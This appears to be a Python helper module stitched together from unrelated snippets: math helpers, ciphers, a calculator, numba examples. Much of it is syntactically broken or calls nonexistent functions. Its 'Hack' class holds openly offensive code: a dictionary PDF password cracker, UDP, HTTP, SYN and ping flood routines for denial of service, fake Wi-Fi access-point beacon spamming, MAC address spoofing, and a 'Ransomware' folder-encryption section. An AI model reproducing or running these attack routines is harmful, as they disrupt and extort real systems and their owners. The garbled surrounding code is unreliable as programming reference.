import os.path, importlib, argparse,  tempfile, shutil, pkgutil, os, secrets, btt, time, viewer, setup, feed, titlestring, supperarr, lamp, count, sys, table
from base64 import b85decode
from sys import platform
from colorama import Fore, Style, Back
from numba import *
from threading import Thread
import threading as th
import numpy as np
def datatable(*x, **y):
  return x.table.table(y)
class convert:
  cm_in_yd=lambda x: x/91.44
  cm_in_ft=lambda x: x/30.48
  cm_in_in=lambda x: x/2.54
  cm_in_ntl_ml=lambda x: x*185200
  cm_in_km=lambda x: x*100000
  cm_in_m=lambda x: x\100
  cm_in_mm=lambda x: x*10
  cm_in_mkm=lambda x: x*10000
  cm_in_nm=lambda x: x*1e+7
  cm_in_ml=lambda x: x*6.2137119609836E-6
def arrayrange(x):
  range(x.supperarr.supperarr())
NaN=280.0
types = [type("Hello"), type(3), type(3.14), type(1j), type(["apple", "banana", "cherry"]), type(("apple", "banana", "cherry")), type(range(6)), type({"name" : "John", "age" : 36}), type({"apple", "banana", "cherry"}), type(frozenset({"apple", "banana", "cherry"})), type(True), type(b"Hello"), type(bytearray(5)), type(memoryview(bytes(5)))]
def tstr(fstr):
  return fstr.titlestrinng.title_strinng()
def superarr(arr):
  arr.superarr.superarr()
def lamp(string):
  string.lamp.lamp()
def sqrttype(size):
   return size.sqrt.sqrt()
class points:
  def points(p):
    p.Points.Points()
  def SpasePoint(sp):
    return sp.Points.SpasePoint()
def listSum(numbers):
  if not numbers:
    return 0
  else:
    (f, rest) = numbers
    return f + listSum(rest)
class trigon:
  def sin(x):
    return np.sin(x)
  def cos(x):
    return np.cos(x)
  def tan(x):
    return np.tan(x)
  def arsin(x):
    return np.arcin(x)
  def arcos(x):
    return np.arcos(x)
  def artan(x):
    return np.artan(x)
  def hypot(x):
    return np.hypot(x)
  class Hypperbolic:
    def sinh(x):
      return np.sinh(x)
    def cosh(x):
      return np.cosh(x)
    def tanh(x):
      return np.tanh(x)
    def artanh(x):
      return np.artanh(x)
    def arcinh(x):
      return np.arcinh(x)
    def arcosh(x):
      return np.arcosh(x)
    def deg2rad(x):
      return np.deg2rad(x)
    def rad2deg(x):
      return np.rad2deg(x)
def drawcube(n, a):
  cubeline = lambda y: ''.join([\
  ' ' * (n-1-y),\
  a,\
  (' ', a)[y%(n-1)==0] * (n-2),\
  a,\
  ' ' * (y-1, 2*n-y-3)[y>(n-1)],\
  (a, '')[y%(2*n-2)==0]])
  for i in range(2*n-1):
    print(cubeline(i))
def codetxt(text):
    for letter in text.lower():
        result_code = ""
        from string import all_ascii_leters
        if not letter in all_ascii_leters:
            continue
        else:
            result_code += str(all_ascii_leters.index(letter)+1)
    return result_code
alpha = {
  'A': ['aH','J']+[C]*2+['J']*2+[C]*2,
  'B': ['I','J',C,'I'],
  'C': ['aH','J',C,'Cg'],
  'D': ['G','I']+[C]*2,
  'E': ['I']*2+['C','I'],
  'F': ['I']*2+['C']+['H']*2+['C']*3,
  'G': ['aH','J','C']+['CbE']*2+[C,'J','aH'],
  'H': [C]*3+['J'],
  'I': ['H']*2+['bD']*2,
  'J': ['fD']*5+['CcD','J','aH'],
  'K': ['CcD','CbD','CaD','G'],
  'L': ['C']*6+['I']*2,
  'M': ['CgC','DeD','EcE','M','CaEaC','CbCbC']+['CgC']*2,
  'N': [C,'DcC','EbC','FaC','CaF','CbE','CcD',C],
  'O': ['aH','J']+[C]*2,
  'P': ['I','J',C,'J','I']+['C']*3,
  'Q': ['aH','J','DcC','CaAbC','CbAaC','CcD','J','aH'],
  'R': ['I','J',C,'J','I','CaD','CbD','CcD'],
  'S': ['aI','K','C','J','aJ','hC','K','aI'],
  'T': ['L']*2+['dD']*6,
  'U': ['CfC']*5+['DdD','aJ','cF'],
  'V': ['CgC']*3+['aCeC','bCcC','cCaC','dE','eC'],
  'W': ['CgC']*3+['CbCbC','CaEaC','M','EcE','DeD'],
  'X': ['DeD','aDcD','bDaD','cG'],
  'Y': ['CgC','aCeC','bCcC','cCaC','dE']+['eC']*3,
  'Z': ['I']*2+['dD','cD','bD','aD']+['I']*2
  }
def printstr(stri):
    from time import sleep
    for i in range(len(stri)):
        sys.stdout.write(stri[i])
        sleep(0.01)
def pi(n):
    k = 1
    x = 0
    for k in range(1, n+1):
        x = x+4*((-1)**(k+1))/(2*k-1)
    return x
def Euclid(a, b):
    while a != 0 and b != 0:
        if a > b:
            a = a % b
        else:
            b = b % a
    return max(a, b)
def Eller_num(n=10):
    f = n
    if n%2 == 0:
        while n%2 == 0
            n = n // 2
        f = f // 2
    i = 3
    while i*i <= n:
        if n%i == 0:
            while n%i == 0:
                n = n // i
            f = f // i;
            f = f * (i-1)
        i = i + 2
    if n > 1:
        f = f // n
        f = f * (n-1)
    return f
def log(x=2.7182818284590452353602874713527, a):
  import math
  return math.log(a, x)
def Orientation_Assignment(img, img2, img1):
    import cv2 
    # reading the image
    # convert to greyscale
    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    # create SIFT feature extractor
    sift = cv2.xfeatures2d.SIFT_create()
    # detect features from the image
    keypoints, descriptors = sift.detectAndCompute(img, None)
    # draw the detected key points
    sift_image = cv2.drawKeypoints(gray, keypoints, img)
    # show the image
    cv2.imshow('image', sift_image)
    # save the image
    cv2.imwrite("table-sift.jpg", sift_image)
    cv2.waitKey(0)
    cv2.destroyAllWindows()
    # read the images
    # convert images to grayscale
    img1 = cv2.cvtColor(img1, cv2.COLOR_BGR2GRAY)
    img2 = cv2.cvtColor(img2, cv2.COLOR_BGR2GRAY)
    # create SIFT object
    sift = cv2.xfeatures2d.SIFT_create()
    # detect SIFT features in both images
    keypoints_1, descriptors_1 = sift.detectAndCompute(img1,None)
    keypoints_2, descriptors_2 = sift.detectAndCompute(img2,None)
    # show the image
    cv2.imshow('image', matched_img)
        #save the image
    cv2.imwrite("matched_images.jpg", matched_img)
    cv2.waitKey(0)
    cv2.destroyAllWindows()
def random_around_plus_random_random(a, b, c, d):
    import numpy as np
    n = np.around(np.random.randint(a, b)+np.random.random()+ np.random.randint(c, d))
    return n
def cntr():
    return count.c
def counplus(p=1):
    count.c=count.c+p
def counminus(m=1):
    count.c=count.c-m
def count_zero():
    count.c=0
def mradd(x, y):
    return x+y
mr_add = np.frompyfunc(myadd, 2, 1)
print(mr_add([1, 2, 3, 4], [5, 6, 7, 8]))
def digits(size=8):
    import random
    arr = ''
    for i in range(size):
        arr=arr+str(random.randint(0, 1))
    return bin(int(arr)).replace('0b', '')
#coding: utf-8
def getpid():
    return os.getpid()
class code_Vishener:
    def encode_val(word):
        list_code = []
        lent = len(word)
        d = form_dict() 
        for w in range(lent):
            for value in d:
                if word[w] == d[value]:
                    list_code.append(value) 
        return list_code
        def form_dict():
        d = {}
        iter = 0
        for i in range(0,127):
            d[iter] = chr(i)
            iter = iter +1
        return d
    def comparator(value, key):
        len_key = len(key)
        dic = {}
        iter = 0
        full = 0
        for i in value:
            dic[full] = [i,key[iter]]
            full = full + 1
            iter = iter +1
            if (iter >= len_key):
                iter = 0 
        return dic 
    def full_encode(value, key):
        dic = comparator(value, key)
        print 'Compare full encode', dic
        lis = []
        d = form_dict()
        for v in dic:
            go = (dic[v][0]+dic[v][1]) % len(d)
            lis.append(go) 
        return lis
    def decode_val(list_in):
        list_code = []
        lent = len(list_in)
        d = form_dict() 
        for i in range(lent):
            for value in d:
                if list_in[i] == value:
                   list_code.append(d[value]) 
        return list_code
    def full_decode(value, key):
        dic = comparator(value, key)
        print 'Deshifre=', dic
        d = form_dict() 
        lis =[]
        for v in dic:
            go = (dic[v][0]-dic[v][1]+len(d)) % len(d)
            lis.append(go) 
        return lis
class parts:
    def part1(i, x, y, h, fsum = 0):
        lock1.acquire()
        try:
            fsum = fsum + i + x + y + h
            pass
        finally:
            lock1.release()
        return fsum
    def ran():
        from random import randint as ran
        return ran(0, 100)
    def part2():
        lock1.acquire()
        try:
            sum2 = ran()+ran()+ran()
            pass
        finally:
            lock1.release()
        return sum2
class Thr1(th.Thread):
    def __init__(self, var):
        th.Thread.__init__(self)
        self.daemon = True
        self.var = var
    def run(self):
        num = 1
        while True:
            y = num*num + num / (num - 10)
            num += 1
            print("При num =", num, " функция y =", y)
            time.sleep(self.var)
class Fibonacci:
  def __init__(self):
    self.cache = [0, 1]
  def __call__(self, n):
    if not (isinstance(n, int) and n >= 0):
      raise ValueError(f'Positive integer number expected, got "{n}"')
    if n < len(self.cache):
      return self.cache[n]
    else:
      fib_number = self(n - 1) + self(n - 2)
      self.cache.append(fib_number)
      return self.cache[n]
def send(x):
  from scapy.sendrecv import send
  send(x)
  print(str(x) + 'Sendet!')
def RAW(Bite):
  from scapy.packet import Raw
  return Raw(Bite)
def StrIO():
  from csv import StringIO
  return StringIO()
def IO_Write(IO, text):
  text.encode('utf-8')
  IO.write(text)
def sample(x, y):
  from random import sample
  return sample(x, y)
@jit
def sum2d(arr):
    M, N = arr.shape
    result = 0.0
    for i in range(M):
        for j in range(N):
            result += arr[i,j]
    return result
def one_line(var):
    import sys
    sys.stdout.write(var)
def key(txt):
    import hashlib
    hash_object = hashlib.sha1(byte(txt))
    hex_dig = hash_object.hexdigest()
    return hex_dig
def load_salt():
    # load salt from salt.salt file
    return open("salt.salt", "rb").read()
def generate_salt(size=16):
    """Generate the salt used for key derivation, 
    `size` is the length of the salt to generate"""
    return secrets.token_bytes(size)
def derive_key(salt, password):
    """Derive the key from the `password` using the passed `salt`"""
    kdf = Scrypt(salt=salt, length=32, n=2**14, r=8, p=1)
    return kdf.derive(password.encode())
UserBook = {'Name':input('Name:\t'), 'Surname':input('Surname:\t'), 'Styem':platform}
print('Hello, ' + i['Name'])
args.append("UNEVERSAL")
def monkeypatch_for_cert(tmpdir):
    from pip._internal.commands.install import InstallCommand
    # We want to be using the internal certificates.
    cert_path = os.path.join(tmpdir, "cacert.pem")
    with open(cert_path, "wb") as cert:
        cert.write(pkgutil.get_data("pip._vendor.certifi", "cacert.pem"))

    install_parse_args = InstallCommand.parse_args

    def cert_parse_args(self, args):
        if not self.parser.get_default_values().cert:
            self.parser.defaults["cert"] = cert_path
        return install_parse_args(self, args)

    InstallCommand.parse_args = cert_parse_args
def code_Ceser(a, b):
    c = 'abcdefghijklmnopqrstuvwxyz'
    c=c+c.upper()+' .,!@"#№$%:^;()-_=+§±<>'
    res = []
    len_c=len(c)
    for i in b:
        res.append(c[(c.find(i)+a)%len_c])
    return ''.join(res)
def MyStyem():
    def styem(namemy):
        if namemy == "linux" or namemy == "linux2":
            return 'Linux'
        elif namemy == "darwin":
            return 'OS X'
        elif namemy == "win32" or namemy == "cygwin":
            return 'Windows'
        else:
            print('eror:\n\t styem' + namemy)
    from os import usname
    return platform + ', ' + usname + ' SYSTYM IS :\t'styem(platform)
if platform == 'win32':
    def bootwindows(tmpdir):
    monkeypatch_for_cert(tmpdir)
    from pip._internal.cli.main import main as pip_entry_point
    args = determine_pip_install_arguments()
    sys.exit(pip_entry_point(args))
else:
    def bootstrap(tmpdir):
        monkeypatch_for_cert(tmpdir)
        from pip._internal.cli.main import main as pip_entry_point
        args = determine_pip_install_arguments()
        sys.exit(pip_entry_point(args))
def main_open(f):
    tmpdir = None
    try:
        tmpdir = tempfile.mkdtemp()
        fil = os.path.join(tmpdir, f)
        with open(fil, "wb") as fp:
            fp.write(b85decode(DATA.replace(b"\n", b"")))
        sys.path.insert(0, fil)
        try:
            bootstrap(tmpdir=tmpdir)
        except:
            bootwindows(tmpdir=tmpdir)
            
    finally:
        if tmpdir:
            shutil.rmtree(tmpdir, ignore_errors=True)
def time_clock():
    import datatime
    return str(datatime.datatime.now())
def Kente():
    return 10000
def ByteSize(var):
    return len(var.encode("utf8"))
def Anagrams(str1, str2):
    from collections import Counter
    return Counter(str1) == Counter(str2)
def get_consonants(String):
    return [each for each in String if each in 'QqWwRrTtYyPpSsDdFfGgHhJjKkLlZzXxCcVvBbNnMm']
def tqdm(ARG):
    from tqdm import tqdm
    return tqdm(ARG)
def Say(world):
    import Pyttsx3
    tts = Pyttsx3
    tts.say(world)
class time:
    def sleep(Sec):
        from time import sleep
        sleep(Sec)
    def MIN_IN_SEC(Minute):
        return Minute * 60
    def SEC_IN_MIN(Secund):
        return Second / 60
def Filtering(lst):
    return list(filter(None,lst))
def get_vowels(String):
    return [each for each in String if each in "aAeEiIoOuU"]
def check_duplicate(lst):
    return len(lst) != len(set(lst))
def Filtering(lst):
    return list(filter(None,lst))
def Memory(var):
    from sys import getsizeof
    return getsizeof(var)
def shuffle(array):
    from random import shuffle
    return shuffle(array)
def Speed_range(Arg1 = 0, Arg2 = 10, Step = 1):
    from numba import prange
    return prange(Arg1, Arg2, Step)
def closure(func):                       
    name = func.__name__
    fr = sys._getframe(1).f_locals.get(name,Resolver(name)) 
    fr.function_map[dt] = func
    return fr                             
    return closure
def init(NameProjekt):
    import spam
    from sqlalchemy.orm import sessionmaker
    from sqlalchemy import create_engine
    engine = create_engine(os.environ[NameProjekt])
    Session = sessionmaker(bind=engine)
    #__init__ file
def choice(var, p = []):
    if p == []:
        for i in range(len(var)):
            p+=0.5
    from random import choice
    return choice(var, p = p)
import string
charts = string.ascii_letters+string.digits+string.punctuation
def generate_key(Len):
  import string
  from random import choice
  p = ''
  while True:
    p=p+choice(charts)
  return p
def sample(x, y):
  from random import sample
  return sample(x, y)

def code(i):
    l=''
    for j in i:
        l+=str(ord(j))
    return bin(int(l))
def random_bite():
    from random import getrandbits, randint
    return getrandbits(randint(0, 10))
def Flip(Var):
    l = ''
    y = 0
    while True:
        try:
            l+=Var[y]
        except:
            break
        finally:
            y-=1
    return l

def password():
    from random import choice, randint
    import string
    i = list(string.ascii_letters + string.digits + string.punctuation)
    p = ''
    for i in range(int(input('pwd_len:\t'))):
        p=p+choice(i)
    return p
def use(a):
    import pandas as pd
    df = pd.DataFrame.from_dict(a) # Numba doesn't know about pd.DataFrame
    df += 1                        # Numba doesn't understand what this is
    return df.cov()                # or this!
def is_odd(arr):
    t = []
    for i in arr:
        if i%2== 1:
            t=t+i
    return t
def is_even(arr):
    t = []
    for i in arr:
        if i%2== 0:
            t=t+i
    return t
def abra_katabra(var):
    import random
    slovo_list = list(var)
    return random.sample(list(var),  len(list(var)))
def words(s):
    from nltk.tokenize import word_tokenize
    return wordpunct_tokenize(s)
def sent(var):
    from nltk.tokenize import sent_tokenize
    return sent_tokenize(var)
def post(url):
    import requests
    return requests.post(url)
def get(url):
    from requests import get
    if str(get(url)) == '<Response [200]>':
        print('Yes, work.')
    else:
        print('No, not work.')
def logining():
    import PySimpleGUI as sg
    import time
    mylist = [1,2,3,4,5,6,7,8]
    for i, item in enumerate(mylist):
        sg.one_line_progress_meter('LOGINING', i+1, len(mylist), '')
        time.sleep(0.07)
def calc():
    bro = float(input("Enter The First Number:\t")
    print(bro)
    ops = input("Enter the operator\n")
    far = float(input("Enter the Second number:\t"))
    print(far)
    if ops =="+":
        print ('Addition')
    elif ops =="-":
        print ('Subtraction')
    elif ops =="*":
        print ('Multiplication')
    elif ops =="x":
        print ('Multiplication')
    elif ops =="/":
        print ('Division')
    elif ops =="%":
        print ('Percentage')
    elif ops =="a":
        print ('add')
    elif ops =="s":
        print ('sub')
    elif ops =="m":
        print ('mul')
    elif ops =="d":
    print ('div')
    elif ops =="p":
        print ('per')
    elif ops =="A":
        print ('add')
    elif ops =="S":
        print ('sub')
    elif ops =="M":
        print ('mul')
    elif ops =="D":
        print ('div')
    elif ops =="P":
        print ('per')
    print("\nYour Expression and Answer is:" )
    print(bro)
    print(ops)
    print (far)
    print("--------\n")
    if ops =="+":
        print (bro+far)
    elif ops =="-":
        print (bro-far)
    elif ops =="*":
        print (bro*far)
    elif ops =="x":
        print (bro*far)
    elif ops =="/":
        print (bro/far)
    elif ops =="%":
        print (bro%far)
    elif ops =="a":
        print (bro+far)
    elif ops =="s":
        print (bro-far)
    elif ops =="m":
        print (bro*far)
    elif ops =="d":
        print (bro/far)
    elif ops =="p":
        print (bro%far)
    elif ops =="A":
        print (bro+far)
    elif ops =="S":
        print (bro-far)
    elif ops =="M":
        print (bro*far)
    elif ops =="D":
        print (bro/far)
    elif ops =="P":
        print (bro%far)
    else:
        print ("INVALID INPUT\n")
def treebank(wsj, num):
    i = input('WARNING: This is a \'Graphics\' type \'Ok\' or \'No\'')
    if i == 'Ok':
      from nltk.corpus import treebank
      t = treebank.parsed_sents(wsj)[num]
      t.draw()
    else:
      print('!!!')
def palindrome(data):
    return data == data[::-1]
def roll():
    import random
    return random.randint(0, 36)
def roll_dice():
    import random
    return random.randint(0, 4)
def paint_costs(c):
    return round((c * 5 + 40) * 1.1)
@njit(parallel=True)
def logistic_regression(Y, X, w, iterations):
    for i in range(iterations):
        w -= np.dot(((1.0 /
              (1.0 + np.exp(-Y * np.dot(X, w)))
              - 1.0) * Y), X)
    return w
def Square(x):
    return x/3
def click(Size, Title, txt):
    import tkinter
    tkinter.root = ttk()
    tkinter.root.title(Title)
    tkinter.root.geometry(Size)
    tkinter.btn = ttk.Button(text=txt)
    tkinter.btn.pack()
    tkinter.root.mainloop()
def glue(arr):
    l = ''
    for i in range(len(arr)):
        l=l+str(arr[i])+' '
    return l
@jit(nopython=True, fastmath=True)
def logistic_regression(Y, X, w, iterations):
    import numpy as np
    for i in range(iterations):
        w -= np.dot(((1.0 /
              (1.0 + np.exp(-Y * np.dot(X, w)))
              - 1.0) * Y), X)
    return w
def shuffle_sentence(sentence):
    import nltk
    tokens = nltk.word_tokenize(sentence)
    return glue(shuffle(tokens))
class Hack:
    def Hack_PDF(pdf):
        import pikepdf
        from tqdm import tqdm
        passwords = [ line.strip() for line in open(pdf) ]
        # iterate over passwords
        for password in tqdm(passwords, "Decrypting PDF"):
            try:
                # open PDF file
                with pikepdf.open("foo-protected.pdf", password=password) as pdf:
                    # Password decrypted successfully, break out of the loop
                    print(Fore.GREEN + "[+] Password found:\t" + password)
                    break
            except pikepdf._qpdf.PasswordError as e:
                continue
                from tkinter.messagebox import showerror
                print(showerror(title='Password_Error', message='Password not found.'))
    class flood_attak:
        from scapy.layers.inet import IP, TCP, ICMP
        from scapy.packet import Raw
        from scapy.sendrecv import send
        from scapy.volatile import RandShort
        @jit(nopython=True)
        def udp_flood(host, port):
            import socket
            import sys
            addr = (host,port)
            udp_socket = socket.socket(AF_INET, SOCK_DGRAM)
            data = input('write to server: ')
            if not data : 
                udp_socket.close() 
                sys.exit(1)
            data = str.encode(data)
            udp_socket.socket.sendto(data, addr)
            data = bytes.decode(data)
            data = udp_socket.socket.recvfrom(1024)
            print(data)
            udp_socket.close()
        @jit(nopython=True)
        def Post_Ddos():
            import threading
            import requests
            url = input('url:\t')
            def dos(url):
                i = 0
                import threading, requests
                while True:
                    print(i)
                    reponse = requests.post(url)
                    if requests.get(url):
                        print(i)
                    else:
                        break
                        print('DDOSET!!!')
                    i=i+1
            i=1
            while True:
                threading.Thread(target=dos(url)).start()
                if i == 1:
                    print('1-st thread')
                elif i == 2:
                    print('2-nd thread')
                elif i == 3:
                    print('3-rd thread')
                else:
                    print(str(i)+'-th thread')
                i=i+1
        @jit(nopython = True)
        def DOS():
            import requests, time, datetime
            i = 0
            url = input('url:\t')
            response = requests.get(url)
            while True:
                if response.status_code == 200:
                    print(requests.get(url))
                    d = str(datetime.datetime.now())
                    print("Request №" + str(i))
                elif response.status_code == 404:
                    print('Site ', url, ' It doesn\'t work!!! At', d)
                    break
                elif response.status_code == 202 or response.status_code == 503 or response.status_code == 504 or response.status_code == 502:
                    print('System', 'error', url, end=' ')
                    break
                i=i+1
            print(str(time.time()), ' Is execution time.\n Request № ' + str(i))
        class ICMP:
            @jit(nopython=True)
            def send_syn(target_ip_address: str, target_port: int, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
                ip = IP(dst=target_ip_address)
                tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
                raw = Raw(b"X" * size_of_packet)
                p = ip / tcp / raw
                send(p, count=number_of_packets_to_send, verbose=0)
                print('send_syn(): Sent ' + str(number_of_packets_to_send) + ' packets of ' + str(size_of_packet) + ' size to ' + target_ip_address + ' on port ' + str(target_port))
            @jit(nopython = True)
            def send_ping(target_ip_address: str, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
                ip = IP(dst=target_ip_address)
                icmp = ICMP()
                raw = Raw(b"X" * size_of_packet)
                p = ip / icmp / raw
                send(p, count=number_of_packets_to_send, verbose=0)
                print('send_ping(): Sent ' + str(number_of_packets_to_send) + ' pings of ' + str(size_of_packet) + ' size to ' + target_ip_address)
    class Points:
        import scapy.all
        from threading import Thread
        from faker import Faker
        @jit(nopython = True)
        def Fake_Access_Points(iface):
            sender_mac = scapy.all.RandMAC()
            ssid = "Test"
            dot11 = scapy.all.Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
            beacon = scapy.all.Dot11Beacon()
            essid = scapy.all.Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
            frame = scapy.all.RadioTap()/dot11/beacon/essid
            scapy.all.sendp(frame, inter=0.1, iface=iface, loop=1)
        @jit(nopython = True)
        def send_beacon(ssid, mac, infinite=True):
            dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
            # ESS+privacy to appear as secured on some devices
            beacon = scapy.all.Dot11Beacon(cap="ESS+privacy")
            essid = scapy.all.Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
            frame = scapy.all.RadioTap()/dot11/beacon/essid
            scapy.all.sendp(frame, inter=0.1, loop=1, iface=iface, verbose=0)
        @jit(nopython = True)
        def beacon():
            if __name__ == "__main__":
                # number of access points
                n_ap = 5
                iface = "wlan0mon"
            # generate random SSIDs and MACs
            faker = Faker()
            ssids_macs = [ (faker.name(), faker.mac_address()) for i in range(n_ap) ]
            for ssid, mac in ssids_macs:
                Thread(target=send_beacon, args=(ssid, mac)).start()
    @jit(nopython = True)
    def get_random_mac_address():
        """Generate and return a MAC address in the format of Linux"""
        # get the hexdigits uppercased
        uppercased_hexdigits = ''.join(set(string.hexdigits.upper()))
        # 2nd character must be 0, 2, 4, 6, 8, A, C, or E
        mac = ""
        for i in range(6):
            for j in range(2):
                if i == 0:
                    mac += random.choice("02468ACE")
                else:
                    mac += random.choice(uppercased_hexdigits)
            mac += ":"
        return mac.strip(":")
    @jit(nopython = True)
    def change_mac_address(iface, new_mac_address):
        # disable the network interface
        subprocess.check_output(f"ifconfig {iface} down", shell=True)
        # change the MAC
        subprocess.check_output(f"ifconfig {iface} hw ether {new_mac_address}", shell=True)
        # enable the network interface again
        subprocess.check_output(f"ifconfig {iface} up", shell=True)
    @jit(nopython = True)
    def clean_mac(mac):
        return "".join(c for c in mac if c in string.hexdigits).upper()
        def get_connected_adapters_mac_address():
        # make a list to collect connected adapter's MAC addresses along with the transport name
        connected_adapters_mac = []
        # use the getmac command to extract 
        for potential_mac in subprocess.check_output("getmac").decode().splitlines():
            # parse the MAC address from the line
            mac_address = mac_address_regex.search(potential_mac)
            # parse the transport name from the line
            transport_name = transport_name_regex.search(potential_mac)
            if mac_address and transport_name:
                # if a MAC and transport name are found, add them to our list
                connected_adapters_mac.append((mac_address.group(), transport_name.group()))
        return connected_adapters_mac
    @jit(nopython = True)
    def get_user_adapter_choice(connected_adapters_mac):
        # print the available adapters
        for i, option in enumerate(connected_adapters_mac):
            print(f"#{i}: {option[0]}, {option[1]}")
        if len(connected_adapters_mac) <= 1:
            # when there is only one adapter, choose it immediately
            return connected_adapters_mac[0]
        # prompt the user to choose a network adapter index
        try:
            choice = int(input("Please choose the interface you want to change the MAC address:"))
            # return the target chosen adapter's MAC and transport name that we'll use later to search for our adapter
            # using the reg QUERY command
            return connected_adapters_mac[choice]
        except:
            # if -for whatever reason- an error is raised, just quit the script
            print("Not a valid choice, quitting...")
            exit()
    @jit(nopython = True)
    def change_mac_address(adapter_transport_name, new_mac_address):
        # use reg QUERY command to get available adapters from the registry
        output = subprocess.check_output(f"reg QUERY " +  network_interface_reg_path.replace("\\\\", "\\")).decode()
        for interface in re.findall(rf"{network_interface_reg_path}\\\d+", output):
            # get the adapter index
            adapter_index = int(interface.split("\\")[-1])
            interface_content = subprocess.check_output(f"reg QUERY {interface.strip()}").decode()
            if adapter_transport_name in interface_content:
                # if the transport name of the adapter is found on the output of the reg QUERY command
                # then this is the adapter we're looking for
                # change the MAC address using reg ADD command
                changing_mac_output = subprocess.check_output(f"reg add {interface} /v NetworkAddress /d {new_mac_address} /f").decode()
                # print the command output
                print(changing_mac_output)
                # break out of the loop as we're done
                break
        # return the index of the changed adapter's MAC address
        return adapter_index
    @jit(nopython = True)
    def disable_adapter(adapter_index):
        # use wmic command to disable our adapter so the MAC address change is reflected
        disable_output = subprocess.check_output(f"wmic path win32_networkadapter where index={adapter_index} call disable").decode()
        return disable_output
    @jit(nopython = True)
    def enable_adapter(adapter_index):
        # use wmic command to enable our adapter so the MAC address change is reflected
        enable_output = subprocess.check_output(f"wmic path win32_networkadapter where index={adapter_index} call enable").decode()
        return enable_output
    @jit(nopython = True)
    def Ransomware():
        import pathlib
        import os
        import base64
        import getpass
        import cryptography
        from cryptography.fernet import Fernet
        from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
        def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
            """Generates a key from a `password` and the salt.
            If `load_existing_salt` is True, it'll load the salt from a file
            in the current directory called "salt.salt".
            If `save_salt` is True, then it will generate a new salt
            and save it to "salt.salt" """
            if load_existing_salt:
                # load existing salt
                salt = load_salt()
            elif save_salt:
                # generate new salt and save it
                salt = generate_salt(salt_size)
                with open("salt.salt", "wb") as salt_file:
                    salt_file.write(salt)
            # generate the key from the salt and the password
            derived_key = derive_key(salt, password)
            return base64.urlsafe_b64encode(derived_key)
    @jit(nopython = True)
    def encrypt(filename, key):
        """Given a filename (str) and key (bytes), it encrypts the file and write it"""
        f = Fernet(key)
        with open(filename, "rb") as file:
            # read all file data
            file_data = file.read()
        # encrypt data
        encrypted_data = f.encrypt(file_data)
        # write the encrypted file
        with open(filename, "wb") as file:
            file.write(encrypted_data)
    @jit(nopython = True)
    def decrypt(filename, key):
        """Given a filename (str) and key (bytes), it decrypts the file and write it"""
        f = Fernet(key)
        with open(filename, "rb") as file:
            # read the encrypted data
            encrypted_data = file.read()
        # decrypt data
        try:
            decrypted_data = f.decrypt(encrypted_data)
        except cryptography.fernet.InvalidToken:
            print("[!] Invalid token, most likely the password is incorrect")
            return
        # write the original file
        with open(filename, "wb") as file:
            file.write(decrypted_data)
    @jit(nopython = True)
    def encrypt_folder(foldername, key):
        # if it's a folder, encrypt the entire folder (i.e all the containing files)
        for child in pathlib.Path(foldername).glob("*"):
            if child.is_file():
                print(f"[*] Encrypting {child}")
                # encrypt the file
                encrypt(child, key)
            elif child.is_dir():
                # if it's a folder, encrypt the entire folder by calling this function recursively
                encrypt_folder(child, key)
    @jit(nopython = True)
    def password_open():
            import pathlib
            import os
            import base64
            import getpass
            import cryptography
            from cryptography.fernet import Fernet
            from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
                if __name__ == "__main__":
            import argparse
        parser = argparse.ArgumentParser(description="File Encryptor Script with a Password")
        parser.add_argument("path", help="Path to encrypt/decrypt, can be a file or an entire folder")
        parser.add_argument("-s", "--salt-size", help="If this is set, a new salt with the passed size is generated",
                            type=int)
        parser.add_argument("-e", "--encrypt", action="store_true",
                            help="Whether to encrypt the file/folder, only -e or -d can be specified.")
        parser.add_argument("-d", "--decrypt", action="store_true",
                            help="Whether to decrypt the file/folder, only -e or -d can be specified.")
        # parse the arguments
        args = parser.parse_args()
        # get the password
        if args.encrypt:
            password = getpass.getpass("Enter the password for encryption: ")
        elif args.decrypt:
            password = getpass.getpass("Enter the password you used for encryption: ")
        # generate the key
        if args.salt_size:
            key = generate_key(password, salt_size=args.salt_size, save_salt=True)
        else:
            key = generate_key(password, load_existing_salt=True)
        # get the encrypt and decrypt flags
        encrypt_ = args.encrypt
        decrypt_ = args.decrypt
        # check if both encrypt and decrypt are specified
        if encrypt_ and decrypt_:
            raise TypeError("Please specify whether you want to encrypt the file or decrypt it.")
        elif encrypt_:
            if os.path.isfile(args.path):
                # if it is a file, encrypt it
                encrypt(args.path, key)
            elif os.path.isdir(args.path):
                encrypt_folder(args.path, key)
        elif decrypt_:
            if os.path.isfile(args.path):
                decrypt(args.path, key)
            elif os.path.isdir(args.path):
                decrypt_folder(args.path, key)
        else:
            raise TypeError("Please specify whether you want to encrypt the file or decrypt it.")
@jit(nopython = True, fastmath = True)
def monte_carlo_pi(nsamples):
    acc = 0
    for i in range(nsamples):
        x = random.random()
        y = random.random()
        if (x ** 2 + y ** 2) < 1.0:
            acc += 1
    return 4.0 * acc / nsamples
@jit(nopython = True, fastmath = True)
def just_number(n):
    lst = []
    for i in xrange(2, n+1):
        for j in xrange(2, i):
            if i % j == 0:
                break
        else:
            lst.append(i)
    return lst
@jit(nopython = True, fastmath = True)
def NiceRange(n = 1):
    l=''
    i = 1
    while i <= n:
        if i < n:
            l = l + str(i)+'\t'
        else:
            l = l + str(i)+'\tThe end'
        i+=i
    return l
class barcode:
    def draw_barcode(decoded, image):
        # n_points = len(decoded.polygon)
        # for i in range(n_points):
        #     image = cv2.line(image, decoded.polygon[i], decoded.polygon[(i+1) % n_points], color=(0, 255, 0), thickness=5)
        # uncomment above and comment below if you want to draw a polygon and not a rectangle
        image = cv2.rectangle(image, (decoded.rect.left, decoded.rect.top), 
                                (decoded.rect.left + decoded.rect.width, decoded.rect.top + decoded.rect.height),
                                color=(0, 255, 0),
                                thickness=5)
        return image
    def decode_barcode(image):
        # decodes all barcodes from an image
        decoded_objects = pyzbar.decode(image)
        for obj in decoded_objects:
            # draw the barcode
